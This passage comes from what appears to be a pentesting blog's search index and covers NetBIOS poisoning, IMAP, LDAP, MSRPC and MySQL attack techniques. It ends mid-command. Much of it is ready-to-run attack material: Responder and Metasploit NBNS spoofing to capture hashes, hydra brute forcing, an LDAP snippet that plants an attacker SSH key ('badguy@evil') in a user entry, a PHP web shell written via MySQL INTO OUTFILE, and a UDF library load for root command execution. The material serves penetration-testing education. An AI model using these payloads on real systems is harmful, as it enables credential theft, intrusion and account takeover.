auxiliary(server/capture/http_ntlm) &gt; set SRVPORT 80msf6 auxiliary(server/capture/http_ntlm) &gt; set URIPATH /msf6 auxiliary(server/capture/http_ntlm) &gt; set cainwpfile /tmp/cain-smbmsf6 auxiliary(server/capture/http_ntlm) &gt; set johnpwfile /tmp/john-smbmsf6 auxiliary(server/capture/http_ntlm) &gt; set logfile /tmp/logfilemsf6 auxiliary(server/capture/http_ntlm) &gt; runHTTP Server listenerThe auxiliary/spoof/nbns/nbns_response module creates NetBIOS broadcast requests over the network and sends NetBIOS name service responses to hosts.msf6 auxiliary(server/capture/http_ntlm) &gt; use auxiliary/spoof/nbns/nbns_responsemsf6 auxiliary(spoof/nbns/nbns_response) &gt; set SPOOFIP 10.10.x.x # Target IP addressmsf6 auxiliary(spoof/nbns/nbns_response) &gt; runSpoofing target machine with NBNS Response.When a network user will attempt to use the NetBIOS broadcast request to identify a resource the traffic will redirected to the attacker host and the password hash will be captured. It’is not worked my demo lab. I think it’s about virtual environment. But i shared expected result from pentestlab.com guide.My demo outputs.expected result hash captured with Metasploit Framework. | From pentestlab.comNetBIOS Poisoning with responderRunning the tool with the following arguments will initiate poisoning against various protocols that require authentication.sudo responder -I eth0 -wFbNow we just wait for an incorrect domain name or an obsolete resource (IP Address) to be entered. In the scenario here, I turned off the Domain Controller that I had previously configured as File Server, and therefore the victim windows could not reach that IP address. Let’s say the Domain Controller is not turned off, but this scenario will work even if the victim tries to go to a non-existent address. On one condition. In the DNS server settings of the room victim machine, the Domain Controller should not write the address. Since the IP address of the Domain Controller on the victim’s computer is not in the DNS records, LLMNR will cause broadcast broadcasting. No matter what we write, it is enough that it is not registered in the Domain Controller.Also, when the victim windows device tries to navigate to any web page in the browser, it will pop up an active directory login form. So you will enter the victim account information and you can get the plaintext passwordPoisened victim machine log.Victim Machine - After trying to open the browser the authentication form satisfies.Captured credentials via plaintext.NetBIOS Poisoning with Powershell on victim MachineYou can poison the Netbios with a PowerShell script called Inveigh on a windows device that you have seized during the tests. This script is part of Empire, PoshC2 and other tools and can be configured as follows:Set-ExecutionPolicy bypassImport-Module .\\Inveigh.ps1Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy YImporting Inveigh module en executing command. There is some captured package info. (NBNS Spoofing)The password hash of the user will be captured like Responder and Metasploit.Hashes via InveighInformation Gathering with enum4linuxenum4linux -a 10.10.x.xInformation gathering with enum4linuxCommon NetBIOS VulnerabilitiesMS16-063: Cumulative Security Update for Internet Explorer [CVE-2016-3205] [CVE-2016-3206] [CVE-2016-3207]MSF: auxiliary/server/netbios_spoof_natMS16-077: Security Update for WPAD [CVE-2016-3213] [CVE-2016-3236] [CVE-2016-3299]MSF: auxiliary/server/netbios_spoof_nat" }, { "title": "IMAP Pentesting Best Practices", "url": "/posts/imap-pentesting-best-practices/", "categories": "pentesting protocols, imap", "tags": "pentesting, imap, best practicies", "date": "2022-06-16 00:00:00 +0300", "snippet": "IMAP IMAP usually uses ports 143, 993What is IMAP?Internet Message Access Protocol (IMAP) is then used by the recipient’s email client to fetch your message from the email server and put it in their inbox. Port 143 - this is the default IMAP non-encrypted port Port 993 - this is the port you need to use if you want to connect using IMAP securelyPORT STATE SERVICE VERSION143/tcp open imap Dovecot imapd (Ubuntu)IMAP Pentesting Shodan search query : port:143, 993 port:143 CAPABILITY port:993 CAPABILITY Banner Grabbing# Banner grabbing and test connectionnc -nv IP 143A1 LOGIN “root” “”A1 LOGIN root toorA1 LOGIN root rootnmap -p143 -sV --script=banner 192.168.x.xnmap -p143 --script=imap-ntlm-info 192.168.x.xmsf &gt; use auxiliary/scanner/imap/imap_versionopenssl s_client -connect 192.168.x.x:993 -quiettelnet 192.168.x.x 143According to the answers to the sent queries, the features of the POP3 implementation (commands, etc.) can be determined.nmap -sV --script=imap-capabilities -p143 10.10.x.xCapturing IMAP Trafficmsf &gt; use auxiliary/server/capture/imapNTLM Auth - Information disclosureIf the server supports NTLM auth (Windows) you can obtain sensitive info (versions):root@kali: telnet example.com 143 * OK The Microsoft Exchange IMAP4 service is ready. &gt;&gt; a1 AUTHENTICATE NTLM + &gt;&gt; TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= + TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAAOr automate this with nmap plugin imap-ntlm-info.nseBrute Forcinghydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; imap -Vhydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f 192.168.x.x imap -Vnmap --script=imap-brute –script-args userdb=Users.list,passdb=Passwords.list -p143 192.168.x.xEvolutionsudo apt install evolutionCURLBasic navigation is possible with CURL, but the documentation is light on details so checking the source is recommended for precise details.# 1. Listing mailboxes (imap command LIST \"\" \"*\")$ curl -k 'imaps://10.10.x.x/' --user user:pass# 2. Listing messages in a mailbox (imap command SELECT INBOX and then SEARCH ALL)$ curl -k 'imaps://10.10.x.x/INBOX?ALL' --user user:pass# The result of this search is a list of message indicies.# Its also possible to provide more complex search terms. e.g. searching for drafts with password in mail body:$ curl -k 'imaps://10.10.x.x/Drafts?TEXT password' --user user:pass# A nice overview of the search terms possible is located [HERE](https://www.atmail.com/blog/imap-commands/).# 3. Downloading a message (imap command SELECT Drafts and then FETCH 1 BODY[])$ curl -k 'imaps://10.10.x.x/Drafts;MAILINDEX=1' --user user:pass# The mail index will be the same index returned from the search operation.# It is also possible to use UID (unique id) to access messages, however it is less conveniant as the search command needs to be manually formatted. E.g.$ curl -k 'imaps://10.10.x.x/INBOX' -X 'UID SEARCH ALL' --user user:pass$ curl -k 'imaps://10.10.x.x/INBOX;UID=1' --user user:pass#Also, possible to download just parts of a message, e.g. subject and sender of first 5 messages (the -v is required to see the subject and sender):$ curl -k 'imaps://10.10.x.x/INBOX' -X 'FETCH 1:5 BODY[HEADER.FIELDS (SUBJECT FROM)]' --user user:pass -v 2&gt;&amp;1 | grep '^&lt;'#Although, its probably cleaner to just write a little for loop (Python):for m in {1..5}; do echo $m curl \"imap://10.10.x.x/INBOX;MAILINDEX=$m;SECTION=HEADER.FIELDS%20(SUBJECT%20FROM)\" --user user:passdoneIMAP VulnerabilitiesEudora Qualcomm WorldMail 3.0 [CVE-2005-4267]msf &gt; use exploit/windows/imap/eudora_list#IMAP Fuzzermsf &gt; use auxiliary/dos/windows/imap/fuzz_imap" }, { "title": "LDAP Pentesting Best Practices", "url": "/posts/ldap-pentesting-best-practices/", "categories": "pentesting protocols, ldap", "tags": "pentesting, ldap, best practicies", "date": "2022-06-15 00:00:00 +0300", "snippet": "LDAP LDAP usually uses ports 389,636,3268,3269What is LDAP?Lightweight directory access protocol (LDAP) is a protocol that makes it possible for applications to query user information rapidly.Companies store usernames, passwords, email addresses, printer connections, and other static data within directories. LDAP is an open, vendor-neutral application protocol for accessing and maintaining that data. LDAP can also tackle authentication, so users can sign on just once and access many different files on the server.LDAP is a protocol, so it doesn’t specify how directory programs work. Instead, it’s a form of language that allows users to find the information they need very quickly.LDAP is vender-neutral, so it can be used with a variety of different directory programs. Typically, a directory contains data that is: Descriptive. Multiple points, such as name and location, come together to define an asset. Static. The information doesn’t change much, and when it does, the shifts are subtle. Valuable. Data stored within the directory is critical to core business functions, and it’s touched over and over again.PORT STATE SERVICE REASON389/tcp open ldap syn-ack636/tcp open LDAPS (SSL)3269/tcp open LDAP Global CatalogThe LDAP Process ExplainedThe average employee connects with LDAP dozens or even hundreds of times per day. That person may not even know the connection has happened even though the steps to complete a query are intricate and complex.An LDAP query typically involves: Session connection. The user connects to the server via an LDAP port. Request. The user submits a query, such as an email lookup, to the server. Response. The LDAP protocol queries the directory, finds the information, and delivers it to the user. Completion. The user disconnects from the LDAP port.Before any search commences, the LDAP must authenticate the user. Two methods are available for that work: Simple. The correct name and password connect the user to the server. Simple Authentication and Security Layer (SASL). A secondary service, such as Kerberos, performs authentication before the user can connect. For companies that require advanced security, this can be a good option.Some queries originate within the company’s walls, but some start on mobile devices or home computers. Most LDAP communication is sent without scrambling or encryption, and that could cause security problems. Most companies use Transport Layer Security (TLS) to ensure the safety of LDAP messages.People can tackle all sorts of operations with LDAP. They can: Add. Enter a new file into the database. Delete. Take out a file from the database. Search. Start a query to find something within the database. Compare. Examine two files for similarities or differences. Modify. Make a change to an existing entry.LDAP Terms to UnderstandCommon terms you’ll see as you begin to learn about LDAP include: Data models. What types of information sit within your directory? Models help you understand the facets within your LDAP. You could have general information (such as an object class), names (how each item is uniquely referenced), functions (how the data is accessed), and security (how users move through authentication). Distinguished name (DN). This is a unique identifier of each entry that also describes location within the information tree. Modifications. These are requests LDAP users make to alter the data associated with an entry. Defined modification types include adding, deleting, replacing, and increasing. Relative distinguished name (RDN). This is a way of tying DNs together while specifying relative location. Schema. The coding that underpins your LDAP is known as schema. You’ll use this language to describe the format and attributes of each item that sits on the server. URLs. This is a string that includes the address and port of a server, along with other data that can define a group, provide a location, or refer an operation to another server. Uniform resource identifier (URI). This is a string of characters that defines a resource.General InformationsArchitecture (LDAP is hierarchical) DC = Domain Component, the domain name OU = Organizational Unit, \"folders CN = Common Name, the name fiven to the objects (Username, Group name, Computer name, etc.)Interesting attributes for user classldapsearch “(objectClass=user)” interesting attributes: sAMAccountName userPrincipalName memberOf (groups) badPwdCount (failed logins) lastLogoff (timestamp) lastLogon (timestamp) pwdLastSet (timestamp) logonCountInteresting attributes for group classldapsearch “(objectClass=group)” interesting attributes: cn member (one per user/group) memberOf (if nested in another group)Interesting attributes for computer classldapsearch “(objectClass=computer)” interesting attributes: name (NetBIOS name) DNSHostName (FQDN) =&gt; combine it with DNS lookups and you can enumerate every IP address in the domain without scanning operatingSystem operatingSystemVersion (patch level) lastLogonTimestamp servicePrincipalName (running services =&gt; TERMSRV, HTTP, MSSQL)LDAP Pentesting Shodan search query : port:389,636,3268 Banner Grabbingnmap -sV -p389 10.10.x.xBasic EnumerationYou can try to enumerate a LDAP with or without credentials using python: pip3 install ldap3First try to connect without credentials:&gt;&gt;&gt; import ldap3&gt;&gt;&gt; server = ldap3.Server('10.10.x.x', get_info = ldap3.ALL, port =636, use_ssl = True)&gt;&gt;&gt; connection = ldap3.Connection(server)&gt;&gt;&gt; connection.bind()True&gt;&gt;&gt; server.infoIf the response is True like in the previous example, you can obtain some interesting data of the LDAP (like the naming context or domain name) server from:&gt;&gt;&gt; server.infoDSA info (from DSE):Supported LDAP versions: 3Naming contexts: dc=DOMAIN,dc=DOMAINOnce you have the naming context you can make some more exciting queries. This simply query should show you all the objects in the directory:&gt;&gt;&gt; connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=*))', search_scope='SUBTREE', attributes='*')True&gt;&gt; connection.entriesOr dump the whole ldap:&gt;&gt; connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')True&gt;&gt;&gt; connection.entriesInformation Collection with Nmap Scriptsnmap -n -sV --script \"ldap* and not brute\" 10.10.x.x #Using anonymous credentialsnmap -p 389 -sV -n --script \"ldap* not brute\" --script-args 'ldap.username=\"cn=0xhav0c,cn=users,dc=secybr,dc=com\",ldap.password=Password' 10.10.x.x nmap -p 389 --script ldap-search --script-args 'ldap.username=\"cn=0xhav0c,cn=users,dc=secybr,dc=com\",ldap.password=ldaptest,ldap.qfilter=custom,ldap.searchattrib=\"operatingSystem\",ldap.searchvalue=\"Windows *Server*\",ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}' 10.10.x.x You can use specific filters from hereWrite dataNote that if you can modify values you could be able to perform really interesting actions. For example, imagine that you can change the “sshPublicKey” information of your user or any user. It’s highly probable that if this attribute exist, then ssh is reading the public keys from LDAP. If you can modify the public key of a user you will be able to login as that user even if password authentication is not enabled in ssh.&gt;&gt;&gt; import ldap3&gt;&gt;&gt; server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)&gt;&gt;&gt; connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)&gt;&gt;&gt; connection.bind()True&gt;&gt;&gt; connection.extend.standard.who_am_i()u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'&gt;&gt;&gt; connection.modify('uid=USER,ou=USERS,dc=DOMAIN=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})Example taken from: https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/CredentialsPlaintext CredentialsIf LDAP is used without SSL you can sniff credentials in plain text in the network.Also, you can perform a MITM attack in the network between the LDAP server and the client. Here you can make a Downgrade Attack so the client with use the credentials in clear text to login.If SSL is used you can try to make MITM like the mentioned above but offering a false certificate, if the user accepts it, you are able to Downgrade the authentication method and see the credentials again.Valid CredentialsIf you have valid credentials to login into the LDAP server, you can dump all the information about the Domain Admin using:pip3 install ldapdomaindump ldapdomaindump -u secybr.com\\0xhav0c -p 'Password' 10.10.x.xBrute Forcingnmap --script ldap-brute -p 389 10.10.x.xCheck NULL credentials or if your credentials are valid.ldapsearch -x -h 10.10.x.x -D '' -w '' -b \"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"ldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"# CREDENTIALS NOT VALID RESPONSEsearch: 2result: 1 Operations errortext: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v3839If you find something saying that the bind must be completed means that the credentials are incorrect.You can extract everything from a domain usingldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"-x Simple Authentication-h LDAP Server-D My User-w My password-b Base site, all data from here will be given#Extract users:ldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"#Extract computers:ldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"CN=Computers,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"#Extract my info:ldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"CN=&lt;MY NAME&gt;,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"#Extract Domain Admins:ldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"CN=Domain Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"#Extract Domain Users:ldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"CN=Domain Users,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"#Extract Enterprise Admins:ldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"CN=Enterprise Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"#Extract Administrators:ldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"CN=Administrators,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"#Extract Remote Desktop Group:ldapsearch -x -h 10.10.x.x -D 'secybr.com\\0xhav0c' -w 'Password' -b \"CN=Remote Desktop Users,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"To see if you have access to any password you can use grep after executing one of the queries:&lt;ldapsearchcmd...&gt; | grep -i -A2 -B2 \"userpas\"Please, notice that the passwords that you can find here could not be the real ones…pbisYou can download pbis from here: https://github.com/BeyondTrust/pbis-open/ and it’s usually installed in /opt/pbis.Pbis allow you to get basic information easily:#Read keytab file./klist -k /etc/krb5.keytab#Get known domains info./get-status./lsa get-status#Get basic metrics./get-metrics./lsa get-metrics#Get users./enum-users./lsa enum-users#Get groups./enum-groups./lsa enum-groups#Get all kind of objects./enum-objects./lsa enum-objects#Get groups of a user./list-groups-for-user &lt;username&gt;./lsa list-groups-for-user &lt;username&gt;#Get groups of each user./enum-users | grep \"Name:\" | sed -e \"s,\\\\\\,\\\\\\\\\\\\\\,g\" | awk '{print $2}' | while read name; do ./list-groups-for-user \"$name\"; echo -e \"========================\\n\"; done#Get users of a group./enum-members --by-name \"domain admins\"./lsa enum-members --by-name \"domain admins\"#Get users of each group./enum-groups | grep \"Name:\" | sed -e \"s,\\\\\\,\\\\\\\\\\\\\\,g\" | awk '{print $2}' | while read name; do echo \"$name\"; ./enum-members --by-name \"$name\"; echo -e \"========================\\n\"; done#Get description of each user./adtool -a search-user --name CN=\"*\" --keytab=/etc/krb5.keytab -n 0xhav0c| grep \"CN\" | while read line; do echo \"$line\"; ./adtool --keytab=/etc/krb5.keytab -n 0xhav0c-a lookup-object --dn=\"$line\" --attr \"description\"; echo \"======================\"doneApache DirectoryDownload Apache Directory from here. You can find an example of how to use this tool here.You can download a graphical interface with LDAP server here: http://www.jxplorer.org/downloads/users.htmlBy default is is installed in: /opt/jxplorer" }, { "title": "MSRPC Pentesting Best Practices", "url": "/posts/msrpc-pentesting-best-practices/", "categories": "pentesting protocols, msrpc", "tags": "pentesting, msrpc, best practicies", "date": "2022-06-14 00:00:00 +0300", "snippet": "MSRPC MSRPC usually uses ports 135, 593What is MSRPC?Microsoft Remote Procedure Call, also known as a function call or a subroutine call, is a protocol that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer’s network. MSRPC was originally derived from open source software but has been developed further and copyrighted by Microsoft.Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.MSRPC working on only: Windows Server 2003 Windows Server 2003 R2 Windows Server 2003 with SP1 Windows Server 2003 with SP2PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPCHow does MSRPC work?The MSRPC process begins on the client side, with the client application calling a local stub procedure instead of code implementing the procedure. The client stub code retrieves the required parameters from the client address space and delivers them to the client runtime library, which then translates the parameters into a standard Network Data Representation format to transmit to the server.The client stub then calls functions in the RPC client runtime library to send the request and parameters to the server. If the server is located remotely, the runtime library specifies an appropriate transport protocol and engine and passes the RPC to the network stack for transport to the server. For more details, please check this link.Pentesting MSRPC Shodan search query : port:135,593,445 Banner Grabbingnmap -sV -p135 10.10.x.xnmap -p135 --script=msrpc-enum 10.10.x.xSome Useful RPC Enumeration Tools and Commands##########################################enum4linux########################################### Verbose modeenum4linux -v 192.168.x.x# Do everythingenum4linux -a 192.168.x.x# List usersenum4linux -U 192.168.x.x# If you've managed to obtain credentials, you can pull a full list of users regardless of the RestrictAnonymous optionenum4linux -u administrator -p password -U 192.168.x.x# Get username from the defaut RID range (500-550, 1000-1050)enum4linux -r 192.168.x.x# Get username using a custom RID rangeenum4linux -R 600-660 192.168.x.x# List groupsenum4linux -G 192.168.x.x# List sharesenum4linux -S 192.168.x.x# Perform a dictionary attack, if the server doesn't let you retrieve a share list enum4linux -s shares.txt 192.168.x.x# Pulls OS information using smbclient, this can pull the service pack version on some versions of Windowsenum4linux -o target-ip# Pull information about printers known to the remove device.enum4linux -i target-ip# enum4linux-ng is a rewrite of the official tool (python3)# adding some features like colors and parsinghttps://github.com/cddmp/enum4linux-ng##########################################rpcclient########################################### Anonymous connection (-N=no pass)rpcclient -U \"\" -N 192.168.x.x# Connection with userrpcclient -U \"user\" 192.168.x.x# Get information about the DCsrvinfo# Get information about objects such as groups(enum*)enumdomainsenumdomgroupsenumalsgroups builtin# Try to get domain password policygetdompwinfo# Try to enumerate different truste domainsdsr_enumtrustdom# Get username for a defined user ?getusername# Query user, group etc informationsqueryuser RIDquerygroupmem519queryaliasmem builtin 0x220# Query info policylsaquery# Convert SID to nameslookupsids SID#Different tool RPCinforpcinfo –p 192.168.x.xIdentifying Exposed RPC ServicesYou can query the RPC locator service and individual RPC endpoints to catalog interesting services running over TCP, UDP, HTTP, and SMB (via named pipes). Each IFID value gathered through this process denotes an RPC service (e.g., 5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc is the Messenger interface).Todd Sabin’s rpcdump and ifids Windows utilities query both the RPC locator and specific RPC endpoints to list IFID values. The rpcdump syntax is as follows:python3 /usr/share/doc/python3-impacket/examples/rpcdump.py 192.168.x.xYou can access the RPC locator service by using four protocol sequences: ncacn_ip_tcp and ncadg_ip_udp (TCP and UDP port 135) ncacn_np (the \\pipe\\epmapper named pipe via SMB) ncacn_http (RPC over HTTP via TCP port 80, 593, and others)msf6 &gt; use auxiliary/scanner/dcerpc/endpoint_mappermsf6 &gt; use auxiliary/scanner/dcerpc/hiddenmsf6 &gt; use auxiliary/scanner/dcerpc/managementmsf6 &gt; use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor Note that from the mentioned options all except of tcp_dcerpc_auditor can only be executed against msrpc in port 135.Notable RPC interfaces IFID value Named pipe Description 12345778-1234-abcd-ef00-0123456789ab \\pipe\\lsarpc LSA interface, used to enumerate users 3919286a-b10c-11d0-9ba8-00c04fd92ef5 \\pipe\\lsarpc LSA Directory Services (DS) interface, used to enumerate domains and trust relationships 12345778-1234-abcd-ef00-0123456789ac \\pipe\\samr LSA SAMR interface, used to access public SAM database elements (e.g., usernames) and brute-force user passwords regardless of account lockout policy Oreilly library​ 1ff70682-0a51-30e8-076d-740be8cee98b \\pipe\\atsvc Task scheduler, used to remotely execute commands 338cd001-2244-31f1-aaaa-900038001003 \\pipe\\winreg Remote registry service, used to access the system registry 367abb81-9844-35f1-ad32-98f038001003 \\pipe\\svcctl Service control manager and server services, used to remotely start and stop services and execute commands 4b324fc8-1670-01d3-1278-5a47bf6ee188 \\pipe\\srvsvc Service control manager and server services, used to remotely start and stop services and execute commands 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57 \\pipe\\epmapper DCOM interface, supporting WMI Identifying IP addressesUsing https://github.com/mubix/IOXIDResolver, comes from Airbus research is possible to abuse the ServerAlive2 method inside the IOXIDResolver interface.This method has been used to get interface information as IPv6 address from the HTB box APT. See here for 0xdf APT writeup, it includes an alternative method using rpcmap.py from Impacket with stringbinding (see above)." }, { "title": "MYSQL Pentesting Best Practices", "url": "/posts/mysql-pentesting-best-practices/", "categories": "pentesting protocols, mysql", "tags": "pentesting, mysql, best practicies", "date": "2022-06-13 00:00:00 +0300", "snippet": "MYSQL MYSQL default uses ports 3306What is MYSQL?MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).PORT STATE SERVICE VERSION3306/tcp open mysqlMYSQL Connection#LOCAL mysql -u root # Connect to root without passwordmysql -u root -p # A password will be asked (check someone)#REMOTEmysql -h &lt;Hostname&gt; -u rootmysql -h &lt;Hostname&gt; -u root@localhostBasic &amp; interesting MySQL commandsshow databases;use &lt;database&gt;;show tables;describe &lt;table_name&gt;;select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privilegesselect user,file_priv from mysql.user where user='root'; #File privilegesselect version(); #versionselect @@version(); #versionselect user(); #Userselect database(); #database name#Try to execute codeselect do_system('id');\\! sh#Basic MySQLiUnion Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tablesUnion Select 1,2,3,4,column_name from information_schema.columns where table_name=\"&lt;TABLE NAME&gt;\"#Read &amp; Writeselect load_file('/var/lib/mysql-files/key.txt'); #Read fileselect 1,2,\"&lt;?php echo shell_exec($_GET['c']);?&gt;\",4 into OUTFILE 'C:/xampp/htdocs/back.php'#Try to change MySQL root passwordUPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';FLUSH PRIVILEGES;quit;mysql -u username -p &lt; manycommands.sql #A file with all the commands you want to executemysql -u root -h 127.0.0.1 -e 'show databases;'MYSQL Pentesting Shodan search query : port:3306 Enumeration# !!!! You should edit --script-args for your MYSQL Server !!!# Audits MySQL database server security configurationnmap -p 3306 --script mysql-audit --script-args \"mysql-audit.username='root', \\ mysql-audit.password='foobar',mysql-audit.filename='nselib/data/mysql-cis.audit'\" 192.168.x.x# Bruteforce accounts and password against a MySQL Servernmap --script=mysql-brute --script-args userdb=users.txt,passdb=passwords.txt -p 3306 192.168.x.x# Attempts to list all databases on a MySQL server. (creds required)nmap -sV --script=mysql-databases -p 3306 192.168.x.x#Dumps the password hashes from an MySQL server in a format suitable (creds required)nmap --script mysql-dump-hashes --script-args='username=root,password=secret' -p 3306 192.168.x.x# Checks for MySQL servers with an empty password for root or anonymous.nmap -sV --script=mysql-empty-password -p 3306 192.168.x.x# Performs valid-user enumeration against MySQL server using a bugnmap --script=mysql-enum -p 3306 192.168.x.x# Connects to a MySQL server and prints information such as the protocol and version numbers, thread ID, status, capabilities, and the password salt.nmap -sV -sC -p 3306 192.168.x.x# Runs a query against a MySQL database and returns the results as a table. (creds required)nmap --script mysql-query --script-args='query=\"&lt;query&gt;\"[,username=&lt;username&gt;,password=&lt;password&gt;]' -p 3306 192.168.x.x# Attempts to list all users on a MySQL server.nmap -sV --script=mysql-users -p 3306 192.168.x.x# Attempts to show all variables on a MySQL server.nmap -sV --script=mysql-variables -p 3306 192.168.x.x# Attempts to bypass authentication in MySQL and MariaDB servers by exploiting CVE2012-2122. If its vulnerable, it will also attempt to dump the MySQL usernames and password hashes. nmap --script mysql-vuln-cve2012-2122 -p3306 192.168.x.xSome of the enumeration actions require valid credentialsmsf&gt; use auxiliary/scanner/mysql/mysql_versionmsf&gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdumpmsf&gt; use auxiliary/scanner/mysql/mysql_hashdump #Need Credentialmsf&gt; use auxiliary/admin/mysql/mysql_enum #Need Credentialmsf&gt; use auxiliary/scanner/mysql/mysql_schemadump #Need Credentialmsf&gt; use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Need CredentialBrute Forcinghydra -L usernames.txt -P pass.txt &lt;IP&gt; mysqlmsf&gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE falsemedusa -h &lt;IP/Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysqlWrite any binary dataCONVERT(unhex(\"6f6e2e786d6c55540900037748b75c7249b75\"), BINARY)CONVERT(from_base64(\"aG9sYWFhCg==\"), BINARY)MySQL arbitrary read file by clientActually, when you try to load data local into a table the content of a file the MySQL or MariaDB server asks the client to read it and send the content. Then, if you can tamper a mysql client to connect to your own MyQSL server, you can read arbitrary files.Please notice that this is the behaviour using:load data local infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n';Notice the “local” word, because without the “local” you can get:mysql&gt; load data infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n';ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statementInitial PoC: https://github.com/allyshka/Rogue-MySql-ServerIn this paper you can see a complete description of the attack and even how to extend it to RCE: https://paper.seebug.org/1113/Here you can find an overview of the attack: http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/Mysql UserIt will be very interesting if mysql is running as root:cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | grep \"user\"Privilege escalationCurrent Level of accessmysql&gt;select user();mysql&gt;select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';Access Passwordsmysql&gt; use mysqlmysql&gt; select user,password from user;Create a new user and grant him privilegesmysql&gt;create user test identified by 'test';mysql&gt; grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;Break into a shellmysql&gt; \\! cat /etc/passwdmysql&gt; \\! bashPrivilege Escalation via libraryYou can find compiled versions of this libraries in sqlmap: locate lib_mysqludf_sys.so and locate lib_mysqludf_sys.dllInstead of locate you can also use whereis to search for this libraries inside the host.Linuxuse mysql;create table npn(line blob);insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';create function sys_exec returns integer soname 'lib_mysqludf_sys.so';select sys_exec('id &gt; /tmp/out.txt');WindowsUSE mysql;CREATE TABLE 